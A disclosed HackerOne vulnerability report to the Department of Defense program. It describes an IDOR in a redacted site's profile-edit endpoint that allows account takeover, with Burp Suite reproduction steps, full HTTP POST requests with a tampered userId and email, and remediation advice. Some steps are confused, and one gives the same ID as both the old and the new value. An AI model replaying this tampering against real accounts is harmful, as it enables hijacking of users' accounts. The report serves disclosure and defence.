# IDOR when editing email leads to Mass Full ATOs (Account Takeovers) without user interaction on https://██████/

## Report Details
- **Report ID**: 1687415
- **URL**: https://hackerone.com/reports/1687415
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2022-08-31T13:24:25.445Z
- **Disclosed**: 2023-01-06T19:16:12.397Z

## Reporter
- **Username**: 696e746c6f6c
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Dear DoD team,

I found one critical bug on your domain: https://██████/
It's IDOR. Also this domain is from Hack US program.

What is that IDOR?

Insecure direct object references (IDOR) are a type of access control vulnerability that arises when an application uses user-supplied input to access objects directly. The term IDOR was popularized by its appearance in the OWASP 2007 Top Ten. However, it is just one example of many access control implementation mistakes that can lead to access controls being circumvented. IDOR vulnerabilities are most commonly associated with horizontal privilege escalation, but they can also arise in relation to vertical privilege escalation.

## Impact

An attacker could do Full ATOs (Account Takeovers) to your users without any user interaction.

## System Host(s)
███

## Affected Product(s) and Version(s)
Users are affected.

## CVE Numbers


## Steps to Reproduce
1. Go to https://████████/
2. Go to vendor login.
3. Make one attacker account and one victim account.
4. Login as attacker.
5.  Go to My Account.
6. Update your profile and intercept your request with burp suite, make sure your foxy proxy is on, you will notice this request, take a look at userId parameter and save it your notepad:

```javascript
POST /█████/EditUserProfile/Save HTTP/1.1
Host: ███
Cookie: .AspNetCore.Antiforgery.w; TS014b77bb=; .AspNetCore.Mvc.CookieTempDataProvider=CfDJ8NZcuopxrrlAnVqYGUtWQxtsA-gq_U4VzTT_UPVtffN4Mp5xSVzjEI6YzVkINoX_FoCmnYWsUdpP1PX2y57UYI527e0mBw40qounVa_WpXWkEiRpco5mBm8LQVC0y_XBbRbcAGbytrA24EqhocKSOupfTKtFzK-iB_2L9ekRNotla0UYoapvcWFDrQZ-KUQn0O65nIfoxkr6gu9jl3nhpy0; .AspNetAuth=CfDJ8NZcuopxrrlAnVqYGUtWQxuUeFWKVXEqlOxL4TNcHc5b0VL5A7Lnq1diP3edMqJn024bJDCv72IDREsFTjeownrswgIQhDCRm_pDHpxUl6_FRedhYqLjnIV5TzDmQgGT6_QoN5XVl-v9n2B5fmWKcfASedgyauzJzwBwafxFKjbIBpmm5oZoBHuDuVTUDFsreYhEbHVPoQDppRn2VhUQ5Vo-QjWelfM8Vi0R8XS98tC1r0j5npE_JKl-GcWXdtzXIgYLS9t9X05kp3a2dcTTUue33v_4taplSArGZzlHWHLYpMz3tLPE07hTkBrjvKCdpw; ASP.NET_SessionId=; TS0144f203=01d263603a2c7f22f24b6e3dc5545eac2dac86e22b777fbefec77dd724498f634cba9a604948cca126e23e438871080faec4034c4fabc579539aadf5f7b2713082206f08b6604332ce5d3a8f14b0f98a460f109128752513a960c47e1656d275e66a06feee; CSRF-TOKEN=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: hr,hr-HR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 537
Origin: https://████
Referer: https://████/██████████/EditUserProfile
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

Email=attacker@gmail.com&PositionTitleIds=10&Title=Pentester&FirstName=attacking&MiddleName=test&LastName=wearehackerone&PhoneNumber=&LanguageId=&Password=&ConfirmPassword=&userId=123464&passChange=true&PersonProfileId=0&CitizenshipId=101&__RequestVerificationToken=
```
6.  Change email to new email: example I changed to this email: █████████ or to ███████
7. But make sure you created victim account.  So, change it to the victim email.
8. Before you change your email, make sure to turn your foxy proxy on and open your burp suite.
9. Now change to victim email.
10. In http history (in Burp Suite) you will notice this request:

```javascript
POST /███/EditUserProfile/Save HTTP/1.1
Host: █████████
Cookie: .AspNetCore.Antiforgery.w; TS014b77bb=; .AspNetCore.Mvc.CookieTempDataProvider=CfDJ8NZcuopxrrlAnVqYGUtWQxtsA-gq_U4VzTT_UPVtffN4Mp5xSVzjEI6YzVkINoX_FoCmnYWsUdpP1PX2y57UYI527e0mBw40qounVa_WpXWkEiRpco5mBm8LQVC0y_XBbRbcAGbytrA24EqhocKSOupfTKtFzK-iB_2L9ekRNotla0UYoapvcWFDrQZ-KUQn0O65nIfoxkr6gu9jl3nhpy0; .AspNetAuth=CfDJ8NZcuopxrrlAnVqYGUtWQxuUeFWKVXEqlOxL4TNcHc5b0VL5A7Lnq1diP3edMqJn024bJDCv72IDREsFTjeownrswgIQhDCRm_pDHpxUl6_FRedhYqLjnIV5TzDmQgGT6_QoN5XVl-v9n2B5fmWKcfASedgyauzJzwBwafxFKjbIBpmm5oZoBHuDuVTUDFsreYhEbHVPoQDppRn2VhUQ5Vo-QjWelfM8Vi0R8XS98tC1r0j5npE_JKl-GcWXdtzXIgYLS9t9X05kp3a2dcTTUue33v_4taplSArGZzlHWHLYpMz3tLPE07hTkBrjvKCdpw; ASP.NET_SessionId=; TS0144f203=01d263603a2c7f22f24b6e3dc5545eac2dac86e22b777fbefec77dd724498f634cba9a604948cca126e23e438871080faec4034c4fabc579539aadf5f7b2713082206f08b6604332ce5d3a8f14b0f98a460f109128752513a960c47e1656d275e66a06feee; CSRF-TOKEN=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: hr,hr-HR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 537
Origin: https://█████████
Referer: https://████████/█████████/EditUserProfile
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

Email=victim@gmail.com&PositionTitleIds=10&Title=Pentester&FirstName=attacking&MiddleName=test&LastName=wearehackerone&PhoneNumber=&LanguageId=&Password=&ConfirmPassword=&userId=123464&passChange=true&PersonProfileId=0&CitizenshipId=101&__RequestVerificationToken=
```
11. In request you can see userId parameter is same from attacker request and from victims request. It doesn't change userId when you update your email.
12. In request, change the ID to your test account's ID.
13. Before changing ID to test account's ID. All you need to do is to create a new account (test account). For test account I was using this email: ██████████
14. If you created test account make sure to turn your foxy proxy on, update your profile and intercept request in your burp suite again.
15. The request should look like this:

```javascript
POST /██████/EditUserProfile/Save HTTP/1.1
Host: ████
Cookie: .AspNetCore.Antiforgery.wZhPOrJ1UhI=CfDJ8NZcuopxrrlAnVqYGUtWQxsyCkGcg0td-ibNe1xIz0u9vm0G-3YwB0P4pSz9OK3QW7SjqdtIdekPY2dPaTat-4pZV-LVeV4tcpazySNA7oIlAih4hGDkWTuUs2TI-NgpY-bdb_cpfQPMg_0qx4HY0CM; TS014b77bb=01d263603a4b90fe81b65bf9d005a81063a1713f030e4e41c68b2e6fdfbcecaf00d41797072a17934e13dae1d4626a7264e9bc4f7962ab399dbbaff75c4d644373978659f05f20018a54e327147891c13e878cb24901785f34934c770f169bd0a39c9e7a1898d41e3487a0ac3992f8549369d38e26; .AspNetCore.Mvc.CookieTempDataProvider=CfDJ8NZcuopxrrlAnVqYGUtWQxtsA-gq_U4VzTT_UPVtffN4Mp5xSVzjEI6YzVkINoX_FoCmnYWsUdpP1PX2y57UYI527e0mBw40qounVa_WpXWkEiRpco5mBm8LQVC0y_XBbRbcAGbytrA24EqhocKSOupfTKtFzK-iB_2L9ekRNotla0UYoapvcWFDrQZ-KUQn0O65nIfoxkr6gu9jl3nhpy0; .AspNetAuth=CfDJ8NZcuopxrrlAnVqYGUtWQxuUeFWKVXEqlOxL4TNcHc5b0VL5A7Lnq1diP3edMqJn024bJDCv72IDREsFTjeownrswgIQhDCRm_pDHpxUl6_FRedhYqLjnIV5TzDmQgGT6_QoN5XVl-v9n2B5fmWKcfASedgyauzJzwBwafxFKjbIBpmm5oZoBHuDuVTUDFsreYhEbHVPoQDppRn2VhUQ5Vo-QjWelfM8Vi0R8XS98tC1r0j5npE_JKl-GcWXdtzXIgYLS9t9X05kp3a2dcTTUue33v_4taplSArGZzlHWHLYpMz3tLPE07hTkBrjvKCdpw; ASP.NET_SessionId=eu31ysfgzyfgxalotfr1jp0x; TS0144f203=01d263603a2c7f22f24b6e3dc5545eac2dac86e22b777fbefec77dd724498f634cba9a604948cca126e23e438871080faec4034c4fabc579539aadf5f7b2713082206f08b6604332ce5d3a8f14b0f98a460f109128752513a960c47e1656d275e66a06feee; CSRF-TOKEN=CfDJ8NZcuopxrrlAnVqYGUtWQxuZMGHTc_PA-LxOQs4LufNUd6SlvBQuwui60roGtUVF6HwaLVOFDk0k4sUrUeJU86NEjNXrbhMY7kJwsA3PmoZw_IT-KFt-kkjbhKz2h_XDzBPCTBsF6xsmvpwMYWnDghE; .AspNetCore.Session=CfDJ8NZcuopxrrlAnVqYGUtWQxui3s4%2B%2FcvDV9iqxakLoPTv9z5kxzKLAjyD1w6iEU%2FcOSjWCKPHXJ7Pzw2199TWmi2x19gHCh4kZh9xG7SqQGGB2nvBSih7M6qtUVbbOkY0oN09QJzXWhcx3HwFysw3OebYvivXRjsW6dzGb0zdpgaa
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: hr,hr-HR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 537
Origin: https://███
Referer: https://██████████/████████/EditUserProfile
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

Email=████████&PositionTitleIds=10&Title=Pentester&FirstName=attacking&MiddleName=test&LastName=wearehackerone&PhoneNumber=13333333333333339&LanguageId=&Password=&ConfirmPassword=&userId=123465&passChange=true&PersonProfileId=0&CitizenshipId=101&__RequestVerificationToken=
```
16. And now you can change the  victims ID to your test account's ID.
17. But when you change your ID to victim's ID example:

```javascript
POST /████████/EditUserProfile/Save HTTP/1.1
Host: █████████
Cookie: .AspNetCore.Antiforgery.w; TS014b77bb=; .AspNetCore.Mvc.CookieTempDataProvider=CfDJ8NZcuopxrrlAnVqYGUtWQxtsA-gq_U4VzTT_UPVtffN4Mp5xSVzjEI6YzVkINoX_FoCmnYWsUdpP1PX2y57UYI527e0mBw40qounVa_WpXWkEiRpco5mBm8LQVC0y_XBbRbcAGbytrA24EqhocKSOupfTKtFzK-iB_2L9ekRNotla0UYoapvcWFDrQZ-KUQn0O65nIfoxkr6gu9jl3nhpy0; .AspNetAuth=CfDJ8NZcuopxrrlAnVqYGUtWQxuUeFWKVXEqlOxL4TNcHc5b0VL5A7Lnq1diP3edMqJn024bJDCv72IDREsFTjeownrswgIQhDCRm_pDHpxUl6_FRedhYqLjnIV5TzDmQgGT6_QoN5XVl-v9n2B5fmWKcfASedgyauzJzwBwafxFKjbIBpmm5oZoBHuDuVTUDFsreYhEbHVPoQDppRn2VhUQ5Vo-QjWelfM8Vi0R8XS98tC1r0j5npE_JKl-GcWXdtzXIgYLS9t9X05kp3a2dcTTUue33v_4taplSArGZzlHWHLYpMz3tLPE07hTkBrjvKCdpw; ASP.NET_SessionId=; TS0144f203=01d263603a2c7f22f24b6e3dc5545eac2dac86e22b777fbefec77dd724498f634cba9a604948cca126e23e438871080faec4034c4fabc579539aadf5f7b2713082206f08b6604332ce5d3a8f14b0f98a460f109128752513a960c47e1656d275e66a06feee; CSRF-TOKEN=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: hr,hr-HR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 537
Origin: https://████████
Referer: https://██████████/██████/EditUserProfile
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

Email=victim@gmail.com&PositionTitleIds=10&Title=Pentester&FirstName=attacking&MiddleName=test&LastName=wearehackerone&PhoneNumber=&LanguageId=&Password=&ConfirmPassword=&userId=123465&passChange=true&PersonProfileId=0&CitizenshipId=101&__RequestVerificationToken=
```
18. Now change to Email parameter to this mail: ██████
19. Update userId parameter from  123464 (attackers ID) to 123464 (tests ID or victims ID).
19. Make sure you changed email.
20. Now send request.
21. Now try to login as a  █████████ with attackers password.
22. You will see it works.

This might sound really confusing report. But believe me it is. I was working on this whole morning. Also follow that redirection in burp suite.

## Suggested Mitigation/Remediation Actions
Web-applications should validate all untrusted input received with every HTTP request. Your applications should perform whitelist validation on each input, verifying that the incoming value meets your applications’ expectations pertaining to:

    Minimum or maximum length
    Minimum or maximum bounds for numeric values
    Acceptable characters
    Data Types like string, date, integer, or rational
    Set membership
    Pattern such as phone number, social security, or employer ID

Using whitelist validation, also called Syntactic Validation, your applications will impose checks, such as the ones above, on each input  that must be satisfied, otherwise it is rejected. Whitelist checks merely certify the content of inputs instead of trying to decipher the meaning behind them.

Your tech teams can leverage Syntactic Validation with Logical Validation by adding checks to see if the input values make sense. Logical validation takes into account the meaning behind reference value and ensures values are consistent with design intent. For example:

    An “id” parameter may represent a customer identifier. Using logical validation, it may be checked to ensure authorized access by the user.
    An “account” parameter may represent a user’s account. Using logical validation, it may be verified that the information displayed is that of the specific user’s.

Using Indirect References

Another way to combat IDORs is to design resources such as ids, names, and keys to be replaced with cryptographically strong random values. These values will correspond to the original values, and both are housed on the server so an application cannot expose a direct reference. These indirect references provide a more complex counter-attack methodology than logical validation, making it more difficult for hackers to substitute meaningful values for references.

Therefore, indirect references are the preferred strategy concerning sensitive information like loan and social security numbers. However, indirect references also make your website performance slightly worse since they influence the design of the site.
Access Control Checks

Access control checks ensure data is provided only to authorized users. Features of access control include:

    Instance-based security competencies which specify access control lists associated with domain objects.
    Resource values in session and on submit are checked at a timed interval with stored values on the server.
    Database checks to ensure information is authentic.

How To Implement IDOR Safeguards

The IDOR designs present vulnerabilities that allow hackers to potentially access personal information via substituted resources. In order to protect against a data breach at your company it’s important to implement syntactic and logical validation, indirect references, and access control checks. These safeguards require deep knowledge of your internal server and will therefore likely need to be executed by internal employees or long-term contractors.

In order to make sure your developers has the necessary skills to keep validations, references, and checks up-to-date and secure, your technology professionals need continuous and expert training. Try some of Avatao’s practical and hands-on exercises to help safeguard against IDORs!
guide



## Attachments
No attachments
